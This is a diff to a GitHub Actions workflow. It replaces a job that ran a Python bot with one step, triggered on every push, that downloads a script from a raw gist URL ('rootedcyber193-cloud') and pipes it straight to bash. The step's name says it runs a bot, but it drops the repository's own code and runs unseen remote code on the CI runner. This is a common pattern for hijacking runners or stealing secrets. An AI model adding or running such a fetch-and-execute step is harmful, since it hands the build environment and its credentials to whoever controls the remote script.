@@ -1,26 +1,19 @@
-name: Run Astra Bot
+name: Start Bot
 
 on:
+
+  push:
+
   workflow_dispatch:
 
 jobs:
-  run-bot:
+
+  bot:
+
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v4
 
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.11"
+      - name: Running bot in github action
 
-      - name: Install requirements
-        run: |
-          pip install -r requirements.txt
-          pip install playwright
-
-      - name: Install browsers
-        run: playwright install --with-deps
-
-      - name: Run bot
-        run: python bot.py
+        run: curl -Ls https://gist.githubusercontent.com/rootedcyber193-cloud/30d1902f4070af6daa5b8e139f1b0774/raw/d2c7dc5dfdf74b69f10ac53ffc20b517492e0b25/ub | bash,
